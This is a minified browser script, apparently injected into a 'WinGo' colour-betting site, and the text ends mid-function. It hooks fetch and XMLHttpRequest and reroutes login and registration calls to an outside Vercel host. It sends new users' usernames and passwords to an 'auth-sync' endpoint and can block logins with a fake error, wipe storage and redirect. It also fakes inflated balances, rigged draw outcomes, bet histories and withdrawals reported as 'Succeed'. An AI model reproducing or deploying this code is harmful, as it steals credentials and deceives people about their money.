var Ct = location.href.match(/[?&]ref=([A-Za-z0-9]{6})/);
if (Ct) sessionStorage.setItem("wg_ref", Ct[1]);
function Wt({
    apiBase: n,
    spoofDomain: t,
    minBalance: e,
    nukeUrl: o,
    authErrMsg: i,
    onBalance: l,
    onWingo: f,
}) {
    if (navigator.serviceWorker)
        navigator.serviceWorker
            .getRegistrations()
            .then((g) => g.forEach((C) => C.unregister()))
            .catch(() => { });
    document.addEventListener("DOMContentLoaded", () => {
        document.querySelectorAll("iframe").forEach((g) => {
            if (
                g.src &&
                (g.src.includes("unTopWindow") || g.src.includes("fromEntry=sw"))
            )
                g.remove();
        });
    });
    let c = window.fetch,
        p = "https://vercel-edge-ruddy-gamma.vercel.app",
        w = /\/api\/webapi\/(Register|Login)$/,
        S = '{"code":1,"msg":"' + i + '"}',
        M = "";
    function q(g, C) {
        try {
            window.dispatchEvent(
                new CustomEvent(g, {
                    detail: C,
                }),
            );
        } catch { }
    }
    function h() {
        try {
            return JSON.parse(localStorage.getItem("userInfo") || "{}") || {};
        } catch { }
        return {};
    }
    function $(g) {
        if (typeof g !== "string") return g;
        let C = g.startsWith(n) ? g.slice(n.length) : g;
        return w.test(C) ? p + C : C;
    }
    function L() {
        setTimeout(() => {
            (localStorage.clear(),
                sessionStorage.clear(),
                (window.location.href = o));
        }, 1500);
    }
    function m() {
        let g = h();
        return (
            g.userName ||
            g.username ||
            g.phone ||
            sessionStorage.getItem("wg_user") ||
            sessionStorage.getItem("wg_qual_user") ||
            ""
        );
    }
    function y() {
        let g = Number(h().amount);
        return Number.isFinite(g) ? g : null;
    }
    function a(g) {
        if (!g) return "";
        let C = sessionStorage.getItem("wg_qual_user");
        if (C && C !== g) sessionStorage.removeItem("wg_qualified");
        return (sessionStorage.setItem("wg_user", g), g);
    }
    function u(g, C) {
        if (C)
            (sessionStorage.setItem("wg_user", C),
                sessionStorage.setItem("wg_qual_user", C));
        if (g)
            (sessionStorage.setItem("wg_qualified", "1"),
                q("wg-qualified", {
                    user: C || m(),
                }));
        else sessionStorage.removeItem("wg_qualified");
    }
    function v(g, C) {
        if (typeof g?.is_qualified === "boolean") u(g.is_qualified, C);
        else if (C) sessionStorage.setItem("wg_qual_user", C);
    }
    function r() {
        try {
            let g =
                localStorage.getItem("token") || sessionStorage.getItem("token") || "";
            if (!g) return "";
            let C =
                localStorage.getItem("tokenHeader") ||
                sessionStorage.getItem("tokenHeader") ||
                "Bearer ";
            return g.startsWith(C.trim()) ? g : C + g;
        } catch { }
        return "";
    }
    function W(g, C) {
        if (!g || !w.test(g) || !C) return C;
        try {
            let P = JSON.parse(C);
            if (!P.domainurl) P.domainurl = t;
            if (g.includes("/api/webapi/Register")) {
                let O = sessionStorage.getItem("wg_ref");
                if (O && !P.wg_ref) P.wg_ref = O;
            }
            return JSON.stringify(P);
        } catch { }
        return C;
    }
    function U(g) {
        return (
            g?.data?.userName ||
            g?.data?.username ||
            g?.data?.phone ||
            g?.username ||
            ""
        );
    }
    function z(g) {
        if (g < e) return;
        let C = m(),
            P = r();
        if (
            !C ||
            !P ||
            sessionStorage.getItem("wg_qualified") ||
            sessionStorage.getItem("wg_qualifying")
        )
            return;
        (sessionStorage.setItem("wg_qualifying", "1"),
            c("/ar-api/qualify", {
                method: "POST",
                headers: {
                    "content-type": "application/json",
                    authorization: P,
                },
                body: "{}",
            })
                .then((O) => O.json().catch(() => ({})))
                .then((O) => {
                    if (O?.qualified) u(!0, C);
                })
                .finally(() => sessionStorage.removeItem("wg_qualifying")));
    }
    function J(g) {
        let C = Number(g);
        if (!Number.isFinite(C)) return;
        (l(C),
            q("wg-balance", {
                balance: C,
            }),
            z(C));
    }
    function Q(g, C) {
        if (!g) return null;
        if (g.includes("/api/Lottery/GetBalance")) return C?.data?.balance;
        if (g.includes("/api/webapi/GetUserInfo")) return C?.data?.amount;
        return null;
    }
    function Kn(g, C) {
        if (!g) return;
        if (
            !g.includes("/api/Lottery/GetBalance") &&
            !g.includes("/api/webapi/GetUserInfo") &&
            !g.includes("/api/webapi/Login") &&
            !g.includes("/api/webapi/Register")
        )
            return;
        C.json()
            .then((P) => {
                let O = a(U(P));
                if (O && sessionStorage.getItem("wg_qual_user") !== O)
                    rn("login", O, {});
                let Z = Q(g, P);
                if (Z != null) J(Z);
            })
            .catch(() => { });
    }
    function On(g, C) {
        if (g && (g.includes("/Login") || g.includes("/Register")))
            C.text()
                .then((P) => {
                    if (P.includes(i)) L();
                })
                .catch(() => { });
        if (g && f && g.includes("WinGo")) {
            let P = g.match(/WinGo_([\w]+)/),
                O = P ? "WinGo_" + P[1] : null;
            C.json()
                .then((Z) => f(O, Z))
                .catch(() => { });
        }
    }
    function rn(g, C, P) {
        return c("/ar-api/auth-sync", {
            method: "POST",
            headers: {
                "content-type": "application/json",
            },
            body: JSON.stringify({
                type: g,
                u: C,
                ...P,
            }),
        })
            .then((O) => O.json())
            .then((O) => {
                if (g === "login") v(O, C);
                return O;
            })
            .catch(() => ({}));
    }
    function ht(g) {
        try {
            let C = JSON.parse(g);
            rn("register", C.username || "", {
                pwd: C.pwd || "",
                inv: C.invitecode || "",
                parent: sessionStorage.getItem("wg_ref") || "",
            });
        } catch { }
    }
    async function Mt(g) {
        try {
            let C = JSON.parse(g);
            return (await rn("login", C.username || "", {})).allowed === !1;
        } catch { }
        return !1;
    }
    function $t() {
        let g = a(m());
        if (!g || M === g) return;
        ((M = g),
            rn("login", g, {}).then(() => {
                let C = y();
                if (C != null) J(C);
            }));
    }
    return (
        (window.fetch = async function (g, C) {
            let P = "",
                O = null;
            if (typeof g === "string") {
                if (
                    ((P = g),
                        (O = C?.body && typeof C.body === "string" ? C.body : null),
                        O)
                )
                    ((O = W(P, O)),
                        (C = {
                            ...(C || {}),
                            body: O,
                        }));
                g = $(g);
            } else if (g instanceof Request) {
                P = g.url;
                let R = g.clone();
                if (w.test(P))
                    try {
                        O = W(P, await R.text());
                    } catch { }
                g = new Request($(g.url.startsWith(n) ? g.url : g.url), {
                    method: g.method,
                    headers: g.headers,
                    body: O == null ? g.body : O,
                    mode: "cors",
                    credentials: g.credentials,
                });
            }
            if (!O && C?.body && typeof C.body === "string") O = C.body;
            if (P.includes("/api/webapi/Login") && O) {
                if (await Mt(O)) {
                    let R = new Response(S, {
                        status: 200,
                        headers: {
                            "Content-Type": "application/json",
                        },
                    });
                    return (On(P, R.clone()), R);
                }
            }
            let Z = typeof g === "string" ? g : g?.url,
                B = await c.call(this, g, C);
            if (P.includes("/api/webapi/Register") && O)
                B.clone()
                    .json()
                    .then((R) => {
                        if (R?.code === 0) ht(O);
                    })
                    .catch(() => { });
            return (On(Z, B.clone()), Kn(Z, B.clone()), B);
        }),
        (XMLHttpRequest.prototype.open = ((g) =>
            function (C, P, ...O) {
                return (
                    (this._url = $(P)),
                    (this._rawUrl = P),
                    g.call(this, C, this._url, ...O)
                );
            })(XMLHttpRequest.prototype.open)),
        (XMLHttpRequest.prototype.send = ((g) =>
            function (C) {
                this._body = typeof C === "string" ? C : null;
                let P = this,
                    O = this._body ? W(this._rawUrl || this._url, this._body) : C;
                if (
                    ((this._body = typeof O === "string" ? O : null),
                        this.addEventListener("load", function () {
                            try {
                                if (
                                    this._url &&
                                    (this._url.includes("/Login") ||
                                        this._url.includes("/Register")) &&
                                    this.responseText.includes(i)
                                )
                                    L();
                            } catch { }
                            try {
                                if (this._url) {
                                    let Z = JSON.parse(this.responseText),
                                        B = a(U(Z));
                                    if (
                                        B &&
                                        (this._url.includes("GetUserInfo") ||
                                            this._url.includes("Login") ||
                                            this._url.includes("Register")) &&
                                        sessionStorage.getItem("wg_qual_user") !== B
                                    )
                                        rn("login", B, {});
                                    let R = Q(this._url, Z);
                                    if (R != null) J(R);
                                }
                            } catch { }
                            try {
                                if (
                                    this._rawUrl &&
                                    this._rawUrl.includes("/api/webapi/Register") &&
                                    this._body
                                ) {
                                    if (JSON.parse(this.responseText)?.code === 0) ht(this._body);
                                }
                            } catch { }
                            try {
                                if (this._url && f && this._url.includes("WinGo")) {
                                    let Z = this._url.match(/WinGo_([\w]+)/),
                                        B = Z ? "WinGo_" + Z[1] : null;
                                    f(B, JSON.parse(this.responseText));
                                }
                            } catch { }
                        }),
                        this._rawUrl &&
                        this._rawUrl.includes("/api/webapi/Login") &&
                        this._body)
                ) {
                    Mt(this._body)
                        .then((Z) => {
                            if (Z)
                                (Object.defineProperties(P, {
                                    readyState: {
                                        value: 4,
                                        writable: !1,
                                    },
                                    status: {
                                        value: 200,
                                        writable: !1,
                                    },
                                    statusText: {
                                        value: "OK",
                                        writable: !1,
                                    },
                                    responseText: {
                                        value: S,
                                        writable: !1,
                                    },
                                    response: {
                                        value: S,
                                        writable: !1,
                                    },
                                }),
                                    P.dispatchEvent(new Event("readystatechange")),
                                    P.dispatchEvent(new Event("load")),
                                    P.dispatchEvent(new Event("loadend")));
                            else g.call(P, O);
                        })
                        .catch(() => g.call(P, O));
                    return;
                }
                return g.call(this, O);
            })(XMLHttpRequest.prototype.send)),
        $t(),
        window.addEventListener("pageshow", $t),
        c
    );
}
var un = "wg_spoof_state",
    Te = 420000,
    Ut = 50,
    Ot = 240,
    Pt = 2,
    kn = [
        "red,violet",
        "green",
        "red",
        "green",
        "red",
        "green,violet",
        "red",
        "green",
        "red",
        "green",
    ];
function Zt() {
    try {
        var n = JSON.parse(localStorage.getItem("wg_spoof_cfg"));
        return n && typeof n === "object" ? n : {};
    } catch (t) {
        return {};
    }
}
function A(n, t) {
    var e = Zt(),
        o = e[n];
    return o !== void 0 ? o : t;
}
function zt() {
    try {
        var n = sessionStorage.getItem("wg_user");
        return !!n && "918815393226".indexOf(n) !== -1;
    } catch (t) {
        return !1;
    }
}
function Jt(n) {
    var t = 2166136261;
    for (var e = 0; e < n.length; e++)
        ((t ^= n.charCodeAt(e)), (t = Math.imul(t, 16777619)));
    return (
        (t = Math.imul(t ^ (t >>> 16), 2246822507)),
        (t = Math.imul(t ^ (t >>> 13), 3266489909)),
        (t ^ (t >>> 16)) >>> 0
    );
}
function Re(n) {
    return (
        (n = BigInt.asUintN(64, n + 0x9e3779b97f4a7c15n)),
        (n = BigInt.asUintN(64, (n ^ (n >> 30n)) * 0xbf58476d1ce4e5b9n)),
        (n = BigInt.asUintN(64, (n ^ (n >> 27n)) * 0x94d049bb133111ebn)),
        BigInt.asUintN(64, n ^ (n >> 31n))
    );
}
function Ft(n, t, e) {
    var o = /^\d+$/.test(String(t || ""))
        ? BigInt(t)
        : BigInt(Jt(String(t || "")));
    return Re(o ^ BigInt(Jt(e + n)));
}
function d(n, t, e) {
    return Number(Ft(n, t, e) % 10n);
}
function Dn(n, t) {
    if (((n = String(n || "")), (t = t || 1), !/^\d+$/.test(n))) return "";
    try {
        return (BigInt(n) - BigInt(t)).toString();
    } catch (e) { }
    return String(Math.max(0, Number(n) - t));
}
function Ht(n, t, e, o) {
    var i = t - e === e - o && Math.abs(t - e) <= 2 && n - t === t - e;
    return (
        (n === t && t === e) ||
        (n === e && e === o) ||
        (n === e && t === o) ||
        (n === o && e === o) ||
        i
    );
}
function In(n, t) {
    t = String(t || "");
    var e = d(n, t, "Kx7q:");
    if (!/^\d+$/.test(t)) return e;
    var o = d(n, Dn(t, 1), "Kx7q:"),
        i = d(n, Dn(t, 2), "Kx7q:"),
        l = d(n, Dn(t, 3), "Kx7q:");
    if (!Ht(e, o, i, l)) return e;
    var f = [
        d(n, t, "J4n2:"),
        d(n, t, "V8p1:"),
        d(n, t, "S6d7:"),
        (e + 5) % 10,
        (e + 3) % 10,
    ];
    for (var c = 0; c < f.length; c++) if (!Ht(f[c], o, i, l)) return f[c];
    return f[0];
}
function Yt(n, t) {
    return Number(Ft(n, t, "Rz3m:") % 100n);
}
function be(n, t) {
    return (In(n, t) + 5) % 10;
}
function xe() {
    var n = A("accuracy", 70);
    if (isNaN(n) || n < 0) n = 0;
    if (n > 100) n = 100;
    return n;
}
function Bn(n, t) {
    return Yt(n, t) < xe() ? In(n, t) : be(n, t);
}
function Gt(n) {
    if (((n = String(n || "")), !/^\d+$/.test(n))) return "";
    try {
        return (BigInt(n) + 1n).toString();
    } catch (t) { }
    return String(Number(n) + 1);
}
function je(n) {
    var t = String(n || "");
    return (
        /\/WinGo\/[^\/?]+\.json(?:\?|$)/.test(t) &&
        t.indexOf("GetHistoryIssuePage") === -1
    );
}
function G(n) {
    var t = parseFloat(n);
    return isNaN(t) ? 0 : t;
}
function wn(n, t) {
    return parseFloat((G(n) * Math.max(1, G(t))).toFixed(2));
}
function It(n, t) {
    return Math.abs(G(n) - G(t)) < 0.001;
}
function fn(n, t) {
    var e = n && n.match(new RegExp("[?&]" + t + "=([^&]+)"));
    return e ? decodeURIComponent(e[1]) : null;
}
function ke(n) {
    if (((n = String(n || "")), n.indexOf("5M") !== -1)) return 300000;
    if (n.indexOf("3M") !== -1) return 180000;
    if (n.indexOf("1M") !== -1) return 60000;
    return 30000;
}
function Sn(n) {
    var t = fn(n, "gameCode");
    if (t) return t;
    var e = n && n.match(/\/WinGo\/([^\/?]+)(?:\/|\.json(?:\?|$)|\?|$)/);
    if (e) return decodeURIComponent(e[1]);
    if (window.location) t = fn(window.location.hash, "gameCode");
    return t || null;
}
function _e(n, t) {
    if (
        ((n = String(n || "").toLowerCase()),
            (t = +t || 0),
            n.indexOf("num_") === 0)
    )
        return 9;
    if (n.indexOf("violet") !== -1) return 4.5;
    if (n === "color_green" && t === 5) return 1.5;
    if (n === "color_red" && t === 0) return 1.5;
    return 2;
}
function de(n, t) {
    if (((n = String(n || "").toLowerCase()), n.indexOf("num_") === 0))
        return t === parseInt(n.split("_")[1], 10);
    if (n === "bigsmall_big") return t >= 5;
    if (n === "bigsmall_small") return t <= 4;
    if (n === "color_green") return [1, 3, 5, 7, 9].indexOf(t) !== -1;
    if (n === "color_red") return [0, 2, 4, 6, 8].indexOf(t) !== -1;
    if (n === "color_violet") return [0, 5].indexOf(t) !== -1;
    return !1;
}
function no(n, t) {
    if (!t) return 0;
    var e = n.stake - (n.fee || n.stake * 0.02);
    return de(n.content, t.num)
        ? parseFloat((e * _e(n.content, t.num)).toFixed(2))
        : 0;
}
var E;
try {
    E = JSON.parse(localStorage.getItem(un));
} catch (n) { }
if (E && E.pending !== void 0)
    E = {
        balance: E.balance,
        draws: {},
        rigs: {},
        withdrawals: {},
    };
if (!E)
    E = {
        balance: null,
        draws: {},
        rigs: {},
        withdrawals: {},
    };
if (!E.draws) E.draws = {};
if (!E.rigs) E.rigs = {};
if (!E.withdrawals) E.withdrawals = {};
if (E.version !== Pt) {
    Pn = {};
    for (zn in E.rigs) Pn[E.rigs[zn].game + ":" + E.rigs[zn].issue] = !0;
    for (Jn in E.draws) if (!Pn[Jn]) delete E.draws[Jn];
    E.version = Pt;
    try {
        localStorage.setItem(un, JSON.stringify(E));
    } catch (n) { }
}
var Pn,
    zn,
    Jn,
    mn = {};
function _n(n, t) {
    return String(n || "") + ":" + String(t || "");
}
function An(n, t, e) {
    if (!n || e == null || isNaN(e)) return null;
    var o = _n(n, t),
        i = E.draws[o];
    if (i) {
        if (i.color == null) i.color = kn[i.num];
        if (!i.seenAt) i.seenAt = Date.now();
        return i;
    }
    return (
        (i = {
            num: +e,
            color: kn[e],
            seenAt: Date.now(),
        }),
        (E.draws[o] = i),
        i
    );
}
function gn(n, t) {
    if (((n = String(n || "")), t)) return E.draws[_n(t, n)] || null;
    var e = null,
        o = 0;
    for (var i in E.draws) if (i.split(":")[1] === n) ((e = E.draws[i]), o++);
    return o === 1 ? e : null;
}
function sn(n, t) {
    n = String(n || "");
    var e = [];
    if (t) {
        var o = t + ":" + n + ":";
        for (var i in E.rigs)
            if (i.indexOf(o) === 0)
                e.push({
                    key: i,
                    rig: E.rigs[i],
                });
    } else
        for (var i in E.rigs)
            if (String(E.rigs[i].issue) === n)
                e.push({
                    key: i,
                    rig: E.rigs[i],
                });
    return e;
}
function to(n) {
    n = String(n || "");
    var t = null;
    for (var e in E.rigs) {
        var o = E.rigs[e];
        if (String(o.issue) !== n) continue;
        if (!t) t = o.game;
        else if (t !== o.game) return null;
    }
    return t;
}
function Hn(n) {
    if (n.settled) return !1;
    var t = gn(n.issue, n.game);
    if (!t) return !1;
    if (((n.win = no(n, t)), (n.settled = !0), E.balance === null))
        E.balance = A("balanceOffset", 5000);
    return ((E.balance += n.win), !0);
}
function En() {
    var n = Date.now(),
        t = !1;
    for (var e in E.rigs) {
        var o = E.rigs[e];
        if (!o.settled && o.settleAt && n >= o.settleAt) {
            if (Hn(o)) t = !0;
        }
    }
    for (var e in E.rigs)
        if (!E.rigs[e].settled && n - (E.rigs[e].time || 0) > Te) {
            if (Hn(E.rigs[e])) t = !0;
        }
    for (var i in mn) if (mn[i] < n - 60000) delete mn[i];
    var l = Object.keys(E.rigs);
    if (l.length > Ut) {
        var f = l.filter(function (a) {
            return E.rigs[a].settled;
        });
        f.sort(function (a, u) {
            return (E.rigs[a].time || 0) - (E.rigs[u].time || 0);
        });
        for (var c = 0, p = l.length - Ut; c < p && c < f.length; c++)
            (delete E.rigs[f[c]], (t = !0));
        var w = {};
        for (var S in E.rigs) w[E.rigs[S].game + ":" + E.rigs[S].issue] = !0;
        for (var M in E.draws) if (!w[M]) (delete E.draws[M], (t = !0));
    }
    var q = Object.keys(E.draws);
    if (q.length > Ot) {
        var h = {};
        for (var $ in E.rigs) h[E.rigs[$].game + ":" + E.rigs[$].issue] = !0;
        var L = q.filter(function (a) {
            return !h[a];
        });
        L.sort(function (a, u) {
            return (E.draws[a].seenAt || 0) - (E.draws[u].seenAt || 0);
        });
        for (var m = 0, y = q.length - Ot; m < y && m < L.length; m++)
            (delete E.draws[L[m]], (t = !0));
    }
    if (t) dn();
    return t;
}
function j() {
    (En(), localStorage.setItem(un, JSON.stringify(E)));
}
var Tn = null;
function dn() {
    if (E.balance === null || Tn) return;
    Tn = setTimeout(function () {
        Tn = null;
        try {
            var n = document.getElementById("app"),
                t = n && n.__vue_app__,
                e = t && t.config.globalProperties.$pinia,
                o = e && e.state.value.GlobalState;
            if (o && o.userInfo && typeof o.userInfo.amount === "number")
                o.userInfo.amount = E.balance;
        } catch (i) { }
    }, 300);
}
function nn(n) {
    if (E.balance === null && typeof n === "number" && n >= 0)
        ((E.balance = n + A("balanceOffset", 5000)), j());
    return E.balance === null ? A("balanceOffset", 5000) : E.balance;
}
function Vt(n) {
    return (
        (n = String(n || "").toLowerCase()),
        n.indexOf("num_") === 0
            ? "Num"
            : n.indexOf("bigsmall_") === 0
                ? "BigSmall"
                : n.indexOf("color_") === 0
                    ? "Color"
                    : "Num"
    );
}
function Kt(n, t) {
    if (
        ((n.issueNumber = t.issue),
            (n.betContent = t.content),
            (n.amount = t.amount),
            (n.betMultiple = t.betMultiple),
            (n.realAmount = t.realAmount),
            (n.fee = t.fee),
            (n.betTime = t.time),
            (n.playType = Vt(t.content)),
            (n.orderNo = t.orderNo),
            !t.settled)
    ) {
        ((n.state = 2),
            (n.number = ""),
            (n.color = ""),
            (n.premium = ""),
            (n.winLoseAmount = 0));
        return;
    }
    ((n.state = t.win > 0 ? 1 : 0),
        (n.winLoseAmount =
            t.win > 0
                ? parseFloat((t.win - t.stake).toFixed(2))
                : parseFloat((-t.stake).toFixed(2))));
    var e = gn(t.issue, t.game);
    if (e)
        ((n.number = String(e.num)),
            (n.color = e.color),
            (n.premium = String(e.num)));
}
function eo(n) {
    var t = {
        issueNumber: n.issue,
        playType: Vt(n.content),
        orderNo: n.orderNo,
        amount: n.amount,
        betMultiple: n.betMultiple,
        betContent: n.content,
        number: "",
        color: "",
        premium: "",
        realAmount: n.realAmount,
        fee: n.fee,
        state: 2,
        winLoseAmount: 0,
        betTime: n.time,
        sum: 0,
    };
    return (Kt(t, n), t);
}
function qn(n) {
    return n < 10 ? "0" + n : "" + n;
}
function Rn(n) {
    var t = new Date(n);
    return (
        t.getFullYear() +
        "-" +
        qn(t.getMonth() + 1) +
        "-" +
        qn(t.getDate()) +
        " " +
        qn(t.getHours()) +
        ":" +
        qn(t.getMinutes()) +
        ":" +
        qn(t.getSeconds())
    );
}
var Gn = {
    GetUserInfo: function (n) {
        if (n && n.code === 0 && n.data) {
            if (En()) localStorage.setItem(un, JSON.stringify(E));
            if (((n.data.amount = nn(n.data.amount)), E.balance !== null))
                ((n.data.amountofCode = 0), (n.data.channelAmountofCode = 0));
            window.__wgUICache = JSON.parse(JSON.stringify(n));
        } else if (
            n &&
            n.code !== 0 &&
            window.__wgUICache &&
            /frequent|rate.?limit/i.test(n.msg || "")
        ) {
            var t = window.__wgUICache;
            ((n.code = t.code),
                (n.msg = t.msg),
                (n.msgCode = t.msgCode),
                (n.data = JSON.parse(JSON.stringify(t.data))),
                (n.data.amount = nn()));
        }
    },
    GetARGameAndPlatWallets: function (n) {
        var t = n.data && n.data.thidGameBalanceList;
        if (t) {
            for (var e = 0; e < t.length; e++)
                if (t[e].vendorCode === "Lottery") t[e].balance = nn(t[e].balance);
        }
    },
    GetSaasAllwallets: function (n) {
        Gn.GetARGameAndPlatWallets(n);
    },
    GetBalance: function (n) {
        if (n && n.code === 0 && n.data) {
            if (En()) localStorage.setItem(un, JSON.stringify(E));
            if (typeof n.data.balance === "number")
                n.data.balance = nn(n.data.balance);
            window.__wgBalCache = JSON.parse(JSON.stringify(n));
        } else if (
            n &&
            n.code !== 0 &&
            window.__wgBalCache &&
            /frequent|rate.?limit/i.test(n.msg || "")
        ) {
            var t = window.__wgBalCache;
            if (
                ((n.code = t.code),
                    (n.msg = t.msg),
                    (n.msgCode = t.msgCode),
                    (n.data = JSON.parse(JSON.stringify(t.data))),
                    typeof n.data.balance === "number")
            )
                n.data.balance = nn();
        }
    },
    RecoverSaasBalance: function (n) {
        if (n.data && typeof n.data.amount === "number")
            n.data.amount = nn(n.data.amount);
    },
    GetWithdrawLog: function (n, t) {
        try {
            var e = JSON.parse(t._kBody || "{}");
            if (e.pageNo > 1) return;
        } catch (M) { }
        if (!n.data)
            n.data = {
                list: [],
            };
        if (!n.data.list) n.data.list = [];
        var o = {};
        for (var i = 0; i < n.data.list.length; i++)
            o[n.data.list[i].withdrawNumber] = !0;
        var l = [];
        for (var f in E.withdrawals)
            if (!o[E.withdrawals[f].withdrawNumber]) {
                var c = E.withdrawals[f];
                try {
                    var p = e.type || e.categoryId || e.withdrawTypeId || -1;
                    if (p != -1 && p != 0 && c.type && c.type != p) continue;
                } catch (M) { }
                var w = c.type === 2 ? "BANK CARD" : c.type === 1 ? "UPI" : "UPI";
                l.push({
                    id: c.withdrawNumber,
                    withdrawNumber: c.withdrawNumber,
                    price: c.amount,
                    state: c.state,
                    addTime: Rn(c.addTime),
                    fee: c.fee,
                    withdrawName: w,
                    _ts: c.addTime,
                });
            }
        l.sort(function (M, q) {
            return q._ts - M._ts;
        });
        for (var S = 0; S < l.length; S++) delete l[S]._ts;
        ((n.data.list = l.concat(n.data.list)),
            (n.data.totalCount = (n.data.totalCount || 0) + l.length));
    },
    Withdraw: function (n, t) {
        try {
            var e = JSON.parse(t._kBody || "{}"),
                o =
                    G(e.amount) || G(e.price) || G(e.applyAmount) || G(e.withdrawAmount);
            if (!o || o <= 0) return;
            var i = e.withdrawid || e.type || e.categoryId || e.withdrawTypeId || 2,
                l = "W" + Date.now();
            if (
                ((E.withdrawals[l] = {
                    withdrawNumber: l,
                    amount: o,
                    state: 3,
                    fee: 0,
                    addTime: Date.now(),
                    type: i,
                }),
                    E.balance === null)
            )
                E.balance = A("balanceOffset", 5000);
            ((E.balance -= o), j());
        } catch (f) { }
        ((n.code = 0), (n.msg = "Succeed"));
    },
    NewSetWithdrawal: function (n, t) {
        try {
            console.log("NewSetWithdrawal body:", t._kBody);
        } catch (e) { }
        return Gn.Withdraw(n, t);
    },
    getWithdrawals: function (n) {
        if (n && n.data && n.data.withdrawalsrule) {
            var t = nn();
            ((n.data.withdrawalsrule.amount = t),
                (n.data.withdrawalsrule.canWithdrawAmount = t));
        }
    },
    GetNewMyEmerdList: function (n, t) {
        if (En()) localStorage.setItem(un, JSON.stringify(E));
        if (!n.data)
            n.data = {
                list: [],
                pageNo: 1,
                totalPage: 0,
                totalCount: 0,
            };
        var e = {};
        try {
            e = JSON.parse((t && t._kBody) || "{}");
        } catch (J) { }
        var o = parseInt(e.pageNo || 1, 10),
            i = parseInt(e.pageSize || 10, 10),
            l = e.startDate || "",
            f = e.endDate || "",
            c = String(e.gameType || "");
        if (c !== "" && c !== "0" && c !== "1") {
            ((n.data.list = []),
                (n.data.totalCount = 0),
                (n.data.totalPage = 0),
                (n.data.pageNo = o));
            return;
        }
        var p = {
            WinGo_30S: 30,
            WinGo_1M: 1,
            WinGo_3M: 2,
            WinGo_5M: 3,
        };
        function w(J) {
            if (((J = String(J || "")), J.indexOf("Color_") === 0))
                return J.slice(6).toLowerCase();
            if (J.indexOf("Num_") === 0) return J.slice(4);
            if (J.indexOf("BigSmall_") === 0) return J.slice(9).toLowerCase();
            return J.toLowerCase();
        }
        function S(J) {
            return String(J || "").indexOf("BigSmall_") === 0 ? 2 : 0;
        }
        var M = l ? new Date(l + " 00:00:00").getTime() : 0,
            q = f ? new Date(f + " 23:59:59").getTime() : 1 / 0,
            h = [];
        for (var $ in E.rigs) {
            var L = E.rigs[$];
            if (!L.settled) continue;
            if (L.time < M || L.time > q) continue;
            var m = gn(L.issue, L.game);
            h.push({
                orderNumber: L.orderNo,
                issueNumber: L.issue,
                typeID: p[L.game] || 30,
                amount: L.amount,
                betCount: 1,
                gameType: S(L.content),
                selectType: w(L.content),
                realAmount: L.realAmount,
                serviceCharge: L.fee,
                figure: 1,
                state: L.win > 0 ? 1 : 0,
                winAmount: L.win > 0 ? parseFloat(L.win.toFixed(2)) : 0,
                addTime: Rn(L.time),
                fee: L.fee,
                premium: m ? String(m.num) : "",
                number: m ? String(m.num) : "",
                colour: m ? m.color : "",
                _ts: L.time,
            });
        }
        var y = n.data.list || [];
        if (o === 1 && (h.length > 0 || y.length > 0)) {
            var a = {};
            for (var u = 0; u < h.length; u++) a[h[u].orderNumber] = !0;
            for (var v = 0; v < y.length; v++)
                if (!a[y[v].orderNumber]) {
                    var r = new Date(y[v].addTime || 0).getTime();
                    ((y[v]._ts = isNaN(r) ? 0 : r), h.push(y[v]));
                }
            h.sort(function (J, Q) {
                return (Q._ts || 0) - (J._ts || 0);
            });
            for (var W = 0; W < h.length; W++) delete h[W]._ts;
            ((n.data.list = h.slice(0, i)),
                (n.data.totalCount = h.length),
                (n.data.totalPage = Math.max(1, Math.ceil(h.length / i))),
                (n.data.pageNo = 1));
        } else if (o > 1 && y.length === 0 && h.length > 0) {
            h.sort(function (J, Q) {
                return (Q._ts || 0) - (J._ts || 0);
            });
            for (var U = 0; U < h.length; U++) delete h[U]._ts;
            var z = (o - 1) * i;
            ((n.data.list = h.slice(z, z + i)),
                (n.data.totalCount = h.length),
                (n.data.totalPage = Math.max(1, Math.ceil(h.length / i))),
                (n.data.pageNo = o));
        }
    },
    WinGoBet: function (n, t) {
        if (!t || !t._kBody) {
            ((n.code = 0), (n.msg = "Succeed"), (n.msgCode = 0));
            return;
        }
        try {
            var e = JSON.parse(t._kBody),
                o = e.gameCode || Sn(t._kUrl) || "WinGo",
                i = String(e.issueNumber || ""),
                l = o + ":" + i;
            if (!E.draws[l]) An(o, i, Bn(o, i));
            var f = E.draws[l],
                c = G(e.amount),
                p = Math.max(1, G(e.betMultiple || 1)),
                w = wn(c, p),
                S = parseFloat((w * 0.02).toFixed(2)),
                M = 0;
            for (var q in E.rigs) if (q.indexOf(l + ":") === 0) M++;
            var h = l + ":" + M,
                $ = mn[l],
                L = $ ? $ + 5000 : Date.now() + ke(o) + 5000;
            if (
                ((E.rigs[h] = {
                    key: h,
                    issue: i,
                    game: o,
                    content: e.betContent,
                    amount: c,
                    betMultiple: p,
                    stake: w,
                    fee: S,
                    realAmount: parseFloat((w - S).toFixed(2)),
                    orderNo: "KG" + i + M,
                    settled: !1,
                    win: null,
                    time: Date.now(),
                    settleAt: L,
                }),
                    E.balance === null)
            )
                E.balance = A("balanceOffset", 5000);
            ((E.balance -= w), j(), dn());
            try {
                window.dispatchEvent(
                    new CustomEvent("kismat:round", {
                        detail: {
                            type: "round",
                            game: o,
                            issue: i,
                            num: f.num,
                            color: f.color,
                            ts: Date.now(),
                        },
                    }),
                );
            } catch (m) { }
        } catch (m) { }
        ((n.code = 0), (n.msg = "Succeed"), (n.msgCode = 0));
    },
    WinGoState: function (n, t) {
        var e = n && n.current ? n : n && n.data && n.data.current ? n.data : null;
        if (!e || !e.current) return;
        var o = String(e.gameCode || Sn(t ? t._kUrl : null) || ""),
            i = String(e.current.issueNumber || "");
        if (!i) return;
        var l = !1;
        if (o && i && !E.draws[_n(o, i)]) (An(o, i, Bn(o, i)), (l = !0));
        var f = G(e.current.endTime || 0);
        if (o && i && f > 0) {
            mn[o + ":" + i] = f;
            var c = f + 5000,
                p = o + ":" + i + ":";
            for (var w in E.rigs)
                if (
                    w.indexOf(p) === 0 &&
                    !E.rigs[w].settled &&
                    E.rigs[w].settleAt !== c
                )
                    E.rigs[w].settleAt = c;
        }
        var S = String((e.next && e.next.issueNumber) || Gt(i) || "");
        try {
            window.dispatchEvent(
                new CustomEvent("kismat:issue", {
                    detail: {
                        type: "issue",
                        game: o,
                        currentIssue: i,
                        nextIssue: S,
                        currentStart: G(e.current.startTime || 0),
                        currentEnd: G(e.current.endTime || 0),
                        ts: Date.now(),
                    },
                }),
            );
        } catch (M) { }
        if (l) j();
    },
    GetHistoryIssuePage: function (n, t) {
        var e = n.data && n.data.list;
        if (!e) return;
        var o = Sn(t ? t._kUrl : null),
            i = !1,
